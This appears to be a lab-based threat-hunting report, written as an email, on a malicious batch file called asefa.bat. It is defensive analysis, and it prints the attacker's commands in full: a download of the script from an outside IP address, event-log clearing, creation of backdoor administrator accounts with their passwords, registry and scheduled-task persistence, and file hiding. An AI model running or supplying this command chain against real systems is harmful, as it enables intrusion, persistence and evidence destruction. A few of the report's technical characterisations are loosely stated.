# Email to Malware Analysis Team - asefa.bat Discovery

---

**To:** malware-analysis-team@company.com  
**Cc:** threat-intel@company.com, incident-response@company.com  
**Subject:** [URGENT] Critical Discovery: asefa.bat
**Priority:** High  
**Attachments:**
1. Thug_Lyfe_Full_Report.md (Full report)
2. [Artifacts.csv](https://github.com/Isaiah-River/FOR-440/blob/main/Thug%20Lyfe%20Campaign/Found%20Artifacts/Artifacts.csv) (Various collected arifacts)
3. [Sysmon_File_Creation.csv](https://github.com/Isaiah-River/FOR-440/blob/main/Thug%20Lyfe%20Campaign/Found%20Artifacts/Sysmon_File_Creation.csv) (asefa.bat file creation found within Sysmon)
4. [Sysmon_Process_Creation.csv](https://github.com/Isaiah-River/FOR-440/blob/main/Thug%20Lyfe%20Campaign/Found%20Artifacts/Sysmon_Process_Creation.csv) (Various process creations found within Sysmon) 

---

Dear Malware Analysis Team,

Following our threat hunting operations for the Thug Lyfe Campaign 2, I am writing to inform you of a critical discovery: we have successfully located and analyzed **asefa.bat**, the malicious batch file that was referenced but not available during your initial static analysis documented in "Searching for a Thug Part 2" (October 13th, 2025).

More importantly, **we captured the complete execution behavior using Sysmon**, providing unprecedented visibility into the post-exploitation activities of the Thug Lyfe threat group.

---

## Executive Summary

**asefa.bat** is a highly sophisticated post-exploitation script that performs:
- **System reconnaissance** (10+ enumeration commands)
- **Anti-forensics** (event log clearing, file hiding)
- **Multiple persistence mechanisms** (2 backdoor accounts, scheduled task, 2 registry keys)
- **Privilege escalation** (adding accounts to Administrators group)
- **Defense evasion** (typosquatting account names, hiding files with +h +s attributes)

**Overall Assessment:** This represents a complete compromise with multi-layered persistence. The threat actor demonstrates sophisticated understanding of Windows internals and defensive evasion techniques.

---

## Artifact Details

### File Information
```
Filename: asefa.bat
Location: C:\ProgramData\asefa.bat
Created: October 26, 2025, 11:12:07 AM (UTC: 18:12:07.271)
Created By: thug_simulator.exe (PID: 10352)
Executed By: cmd.exe
User Context: WIN10-ISAIAH\IEUser
```

### Delivery Mechanism (from previous analysis)
As documented in your report, frontpage.jpg contained the Base64-encoded PowerShell command that downloaded this file from 108.181.155.31:
```powershell
cmd /c powershell invoke-webrequest -uri 'http://108.181.155.31/asefa.bat' 
-outfile 'c:\programdata\asefa.bat'
```

---

## Behavioral Analysis - Complete Attack Chain

Using Sysmon Event IDs 1 (Process Creation) and 11 (File Creation), we captured the entire execution sequence. The batch file executed **36 distinct malicious actions** over an 8-second period.

### Phase 1: System Reconnaissance (11:12:09 - 11:12:14)

The batch file began with comprehensive system enumeration:

**1. System Information Gathering (11:12:09)**
```cmd
systeminfo /fo csv
```
- Collected: OS version, hotfixes, hardware details, domain info
- **Purpose:** Identify system configuration and patch level

**2. Network Configuration Enumeration (11:12:13)**
```cmd
netsh interface show interface
ipconfig /displaydns
netstat -anob
```
- **Purpose:** Map network topology, identify C2 opportunities, enumerate active connections
- **Significance:** DNS cache reveals recently contacted domains/IPs

**3. User Account Enumeration (11:12:13-11:12:14)**
```cmd
wmic useraccount get name,sid
net user
```
- **Purpose:** Identify privileged accounts for potential credential theft

**4. Service and Persistence Enumeration (11:12:14)**
```cmd
sc query type= service state= all
schtasks /query /fo CSV /v
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall
```
- **Purpose:** Map existing services, scheduled tasks, startup programs, and installed software
- **Significance:** Identifies defensive tools and persistence opportunities

---

### Phase 2: Event Log Clearing - Anti-Forensics (11:12:17)

**⚠️ CRITICAL: The threat actor cleared ALL major Windows event logs**

```cmd
wevtutil cl Application
wevtutil cl Security  
wevtutil cl System
```

**Impact Analysis:**
- **Security log cleared:** Removes evidence of logon events, privilege changes, audit events
- **System log cleared:** Removes service installation, system errors, driver loads
- **Application log cleared:** Removes application crashes, errors, warnings

**Forensic Significance:**
This is a **direct anti-forensics technique** designed to:
1. Remove evidence of the initial compromise
2. Delete audit trails of account creation
3. Eliminate process execution records
4. Frustrate incident response efforts

**⚠️ This action occurred AFTER reconnaissance but BEFORE persistence establishment**, suggesting the threat actor wanted to clear evidence of the enumeration phase while preserving logs of "normal" system operation after backdoors were installed.

---

### Phase 3: Backdoor Account Creation (11:12:17)

**The batch file created TWO backdoor administrator accounts using typosquatting:**

**Backdoor Account #1: "SYSTEM_SERVICE"**
```cmd
net user SYSTEM_SERVICE Svc@Admin#99 /add
net localgroup Administrators SYSTEM_SERVICE /add
```
- **Username:** SYSTEM_SERVICE (mimics legitimate service accounts)
- **Password:** Svc@Admin#99 (complex, memorable for attacker)
- **Privileges:** Administrator
- **Evasion Tactic:** Name appears legitimate, blends with service accounts

**Backdoor Account #2: "Administators" (Typosquatting!)**
```cmd
net user Administators Secur1ty@2025 /add
net localgroup Administrators Administators /add
```
- **Username:** Administators (**intentional typo of "Administrators"**)
- **Password:** Secur1ty@2025
- **Privileges:** Administrator
- **Evasion Tactic:** **SOPHISTICATED TYPOSQUATTING**
  - Looks like "Administrators" at casual glance
  - Missing the second 'i': Adm**i**n**i**strators → Adm**i**n**i**stators
  - Likely to be overlooked by administrators
  - Provides plausible deniability if discovered

**MITRE ATT&CK Mapping:**
- **T1136.001** - Create Account: Local Account
- **T1078.003** - Valid Accounts: Local Accounts
- **T1036.004** - Masquerading: Masquerade Task or Service

---

### Phase 4: Persistence Establishment (11:12:17)

The threat actor established **three separate persistence mechanisms** to ensure continued access:

**Persistence Method #1: Scheduled Task**
```cmd
schtasks /create /tn "WindowsUpdateCheck" /tr "C:\ProgramData\SecurityUpdate\svchost.exe" 
/sc onlogon /rl HIGHEST /f
```
- **Task Name:** "WindowsUpdateCheck" (mimics legitimate Windows Update)
- **Executable:** C:\ProgramData\SecurityUpdate\svchost.exe
- **Trigger:** On user logon
- **Privilege Level:** HIGHEST (SYSTEM-level execution)
- **Evasion:** Task name appears legitimate

**Persistence Method #2: Registry RunOnce**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" 
/v "SecurityScan" /t REG_SZ /d "C:\ProgramData\SecurityUpdate\svchost.exe" /f
```
- **Key:** HKCU RunOnce
- **Value Name:** "SecurityScan" (appears legitimate)
- **Executable:** C:\ProgramData\SecurityUpdate\svchost.exe

**Persistence Method #3: Registry Run**
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" 
/v "WindowsDefender" /t REG_SZ /d "C:\ProgramData\SecurityUpdate\svchost.exe" /f
```
- **Key:** HKCU Run (persists across all logons)
- **Value Name:** "WindowsDefender" (**masquerading as Windows Defender**)
- **Executable:** C:\ProgramData\SecurityUpdate\svchost.exe

**⚠️ CRITICAL OBSERVATION:**
All persistence mechanisms reference **C:\ProgramData\SecurityUpdate\svchost.exe**
- **svchost.exe is a FAKE** - legitimate svchost.exe resides in C:\Windows\System32
- This is **masquerading** as a legitimate Windows process
- The "SecurityUpdate" folder name provides additional legitimacy cover

**MITRE ATT&CK Mapping:**
- **T1053.005** - Scheduled Task/Job: Scheduled Task
- **T1547.001** - Boot or Logon Autostart: Registry Run Keys
- **T1036.005** - Masquerading: Match Legitimate Name or Location
- **T1036.004** - Masquerading: Masquerade Task or Service

---

### Phase 5: File Hiding - Defense Evasion (11:12:17)

The batch file then **hid multiple files** using the attrib command to set hidden (+h) and system (+s) attributes:

**Hidden Directory:**
```cmd
attrib +h +s C:\ProgramData\SecurityUpdate
```

**Hidden Files (11 total):**
```cmd
attrib +h +s C:\ProgramData\autorun.dat
attrib +h +s C:\ProgramData\apps.dat
attrib +h +s C:\ProgramData\jobs.dat
attrib +h +s C:\ProgramData\services.dat
attrib +h +s C:\ProgramData\userlist.dat
attrib +h +s C:\ProgramData\accounts.dat
attrib +h +s C:\ProgramData\connections.dat
attrib +h +s C:\ProgramData\dns.dat
attrib +h +s C:\ProgramData\network.dat
attrib +h +s C:\ProgramData\config.dat
```

**Analysis of Hidden Files:**
Based on the filenames, these **.dat files likely contain exfiltrated reconnaissance data:**

| Filename | Likely Contents |
|----------|----------------|
| autorun.dat | Startup programs and persistence mechanisms |
| apps.dat | Installed applications |
| jobs.dat | Scheduled tasks |
| services.dat | Running services |
| userlist.dat | Local user accounts and SIDs |
| accounts.dat | User account details |
| connections.dat | Active network connections |
| dns.dat | DNS cache entries |
| network.dat | Network interface configuration |
| config.dat | System configuration |

**Evasion Technique:**
- **+h (Hidden)** - Files won't appear in default directory listings
- **+s (System)** - Files appear as system files, further reducing visibility
- Files are NOT visible with standard `dir` command
- Requires `dir /a` or `attrib` to discover
- **Purpose:** Exfiltrate reconnaissance data while evading detection

**MITRE ATT&CK Mapping:**
- **T1564.001** - Hide Artifacts: Hidden Files and Directories
- **T1074.001** - Data Staged: Local Data Staging

---

## Intelligence Assessment

### Threat Actor Sophistication: HIGH

The Thug Lyfe threat group demonstrates:

1. **Advanced Windows Internals Knowledge**
   - Uses built-in Windows utilities (LOLBins)
   - Understands persistence mechanisms across multiple attack vectors
   - Leverages legitimate administrative tools (net, reg, schtasks, attrib)

2. **Defense Evasion Expertise**
   - **Typosquatting:** "Administators" vs "Administrators"
   - **Process Masquerading:** Fake svchost.exe in non-standard location
   - **Legitimate-Appearing Names:** "WindowsUpdateCheck", "SecurityScan", "WindowsDefender"
   - **File Hiding:** System + Hidden attributes on exfiltration staging files
   - **Anti-Forensics:** Event log clearing

3. **Operational Security**
   - Clears logs AFTER reconnaissance but BEFORE persistence
   - Creates multiple redundant persistence mechanisms
   - Stages data locally before exfiltration (implies second-stage payload)
   - Uses complex passwords for backdoor accounts

4. **Attack Methodology**
   - Systematic reconnaissance → anti-forensics → persistence → data staging
   - Logical attack flow suggests automated/scripted approach
   - All actions completed in 8 seconds (automated execution)

---

## Indicators of Compromise (IOCs)

### File System Artifacts

**Primary Malicious File:**
```
C:\ProgramData\asefa.bat
```

**Secondary Payload (referenced, may or may not exist):**
```
C:\ProgramData\SecurityUpdate\svchost.exe
```

**Staged Reconnaissance Data:**
```
C:\ProgramData\SecurityUpdate\ (hidden directory)
C:\ProgramData\autorun.dat (hidden)
C:\ProgramData\apps.dat (hidden)
C:\ProgramData\jobs.dat (hidden)
C:\ProgramData\services.dat (hidden)
C:\ProgramData\userlist.dat (hidden)
C:\ProgramData\accounts.dat (hidden)
C:\ProgramData\connections.dat (hidden)
C:\ProgramData\dns.dat (hidden)
C:\ProgramData\network.dat (hidden)
C:\ProgramData\config.dat (hidden)
```

### User Accounts Created

**⚠️ CRITICAL - Search enterprise-wide for these accounts:**
```
Username: SYSTEM_SERVICE
Password: Svc@Admin#99
Privileges: Administrators group

Username: Administators (note the typo!)
Password: Secur1ty@2025
Privileges: Administrators group
```

### Persistence Mechanisms

**Scheduled Task:**
```
Task Name: WindowsUpdateCheck
Action: C:\ProgramData\SecurityUpdate\svchost.exe
Trigger: On Logon
```

**Registry Keys:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
  Value: SecurityScan
  Data: C:\ProgramData\SecurityUpdate\svchost.exe

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  Value: WindowsDefender
  Data: C:\ProgramData\SecurityUpdate\svchost.exe
```

### Process Execution Hashes (from Sysmon)

**wevtutil.exe** (used for log clearing):
```
MD5: 0C75F10DF679B8709DFE49E83798F8B3
SHA256: 65E3BD3FD7F0C6DC9BA344D042883A1B09AC04E4AE055B4B2D251F15EACE397B
IMPHASH: 63245F43F53A910C0680A04F9F61488A
```

**net.exe** (used for account creation):
```
MD5: AE61D8F04BCDE8158304067913160B31
SHA256: 25C8266D2BC1D5626DCDF72419838B397D28D44D00AC09F02FF4E421B43EC369
IMPHASH: 57F0C47AE2A1A2C06C8B987372AB0B07
```

**attrib.exe** (used for hiding files):
```
MD5: 3A536CC896D9C6CA2C2EE4C21CCA1DFA
SHA256: B101350BCEEB773B7E77759613BB33C28FBF1D79A13C2CB783575A9D893D52E6
IMPHASH: 2CB38FE7D8F223D9DA50B7CBA9B95A6D
```

**schtasks.exe** (used for persistence):
```
MD5: 4AC970870E5214BC1BBD361497678D7E
SHA256: 812CCFA2D234EF9989E1730976DD8217D0F3107FBD92244454A5FB735051B8DB
IMPHASH: 656E507A52D86EA244654C79E5043256
```

**reg.exe** (used for registry persistence):
```
MD5: 8A93ACAC33151793F8D52000071C0B06
SHA256: 19316D4266D0B776D9B2A05D5903D8CBC8F0EA1520E9C2A7E6D5960B6FA4DCAF
IMPHASH: BE482BE427FE212CFEF2CDA0E61F19AC
```

---

## MITRE ATT&CK Mapping

The complete attack chain maps to the following techniques:

### Reconnaissance
- **T1082** - System Information Discovery
- **T1016** - System Network Configuration Discovery
- **T1018** - Remote System Discovery
- **T1087.001** - Account Discovery: Local Account
- **T1007** - System Service Discovery
- **T1049** - System Network Connections Discovery
- **T1083** - File and Directory Discovery

### Privilege Escalation
- **T1136.001** - Create Account: Local Account
- **T1078.003** - Valid Accounts: Local Accounts

### Persistence
- **T1053.005** - Scheduled Task/Job: Scheduled Task
- **T1547.001** - Boot or Logon Autostart: Registry Run Keys

### Defense Evasion
- **T1070.001** - Indicator Removal: Clear Windows Event Logs
- **T1564.001** - Hide Artifacts: Hidden Files and Directories
- **T1036.004** - Masquerading: Masquerade Task or Service
- **T1036.005** - Masquerading: Match Legitimate Name or Location
- **T1202** - Indirect Command Execution

### Collection
- **T1074.001** - Data Staged: Local Data Staging

---

## Recommended Actions

### Immediate (Priority 1)

1. **Enterprise-Wide Hunt for Backdoor Accounts**
   ```powershell
   # Search for both backdoor accounts on all systems
   Get-LocalUser | Where-Object {
       $_.Name -eq "SYSTEM_SERVICE" -or 
       $_.Name -eq "Administators"
   }
   ```

2. **Update Campaign Report**
   - Incorporate asefa.bat behavioral analysis
   - Add new IOCs (accounts, persistence mechanisms, hidden files)
   - Update ATT&CK mappings with new techniques

3. **IOC Dissemination**
   - Add backdoor account names to monitoring alerts
   - Create detection rules for fake svchost.exe in ProgramData
   - Alert on scheduled task "WindowsUpdateCheck"
   - Alert on registry values "SecurityScan" and "WindowsDefender" pointing to ProgramData

### Short-Term (Priority 2)

4. **YARA Rule Development**
   Create detection for:
   - asefa.bat content patterns
   - wevtutil event log clearing sequences
   - Typosquatting account names
   - Hidden .dat file staging patterns

5. **Behavioral Detection Rules**
   - Alert on: wevtutil clearing Security, System, AND Application logs in sequence
   - Alert on: net user + net localgroup combinations creating admin accounts
   - Alert on: attrib +h +s on multiple ProgramData files
   - Alert on: schtasks creating tasks pointing to ProgramData executables

6. **Threat Intel Sharing**
   - Share complete behavioral analysis with industry partners
   - Submit samples to MISP/threat intelligence platforms
   - Update threat actor profile with new TTPs

### Long-Term (Priority 3)

7. **Enhanced Monitoring**
   - Deploy Sysmon enterprise-wide (if not already deployed)
   - Enable PowerShell Script Block Logging
   - Implement centralized log collection
   - Alert on event log clearing attempts

8. **Preventative Controls**
   - Implement application whitelisting (block executables from ProgramData)
   - Restrict wevtutil.exe execution to administrators only
   - Monitor for account creation in real-time
   - Implement honeypot accounts to detect enumeration

---

## Data Sharing

I have attached the complete Sysmon analysis in CSV format:

**Attachments:**
1. [Sysmon_File_Creation.csv](https://github.com/Isaiah-River/FOR-440/blob/main/Thug%20Lyfe%20Campaign/Found%20Artifacts/Sysmon_File_Creation.csv) - File creation event (Sysmon Event ID 11)
2. [Sysmon_Process_Creation.csv](https://github.com/Isaiah-River/FOR-440/blob/main/Thug%20Lyfe%20Campaign/Found%20Artifacts/Sysmon_Process_Creation.csv) - All 36 process execution events (Sysmon Event ID 1)


These files contain:
- Exact timestamps for each malicious action
- Process IDs and parent-child relationships
- Complete command lines executed
- File paths for all artifacts
- MD5, SHA256, and Import Hash values for all executables

The data demonstrates the complete attack chain from initial execution through final file hiding, providing unprecedented visibility into Thug Lyfe's post-exploitation tradecraft.

---

## Coordination and Next Steps

I recommend we schedule a coordination call within the next 24 hours to discuss:

1. **Report Update Timeline** - When will the updated campaign analysis be published?
2. **IOC Distribution** - How quickly can we push these IOCs to defensive tools?
3. **Enterprise Hunting** - Do you need our team's assistance hunting for these artifacts across the enterprise?
4. **Attribution Confidence** - Does this behavioral analysis strengthen attribution to Thug Lyfe?
5. **External Sharing** - Should this analysis be shared with external partners or industry groups?

Our threat hunting team captured this data in a controlled lab environment using the threat simulator. However, the sophistication of asefa.bat suggests this represents **actual Thug Lyfe tradecraft** rather than theoretical capabilities. Organizations compromised by this campaign may have:

- Persistent backdoor accounts (SYSTEM_SERVICE, Administators)
- Cleared event logs (reducing forensic evidence)
- Hidden reconnaissance data staged for exfiltration
- Multiple persistence mechanisms ensuring continued access
- Fake svchost.exe waiting to execute on logon

**This represents a complete system compromise requiring full incident response.**

---

## Conclusion

The discovery and behavioral analysis of asefa.bat represents a **critical intelligence gain** for understanding the Thug Lyfe threat group's post-exploitation capabilities. The combination of:

- Typosquatting (Administators)
- Process masquerading (fake svchost.exe)
- Anti-forensics (event log clearing)
- Multi-layered persistence
- Systematic reconnaissance data staging

...demonstrates a **highly sophisticated threat actor** with deep Windows internals knowledge and advanced operational security practices.

---

**Best regards,**

Isaiah River   
Date: October 26, 2025
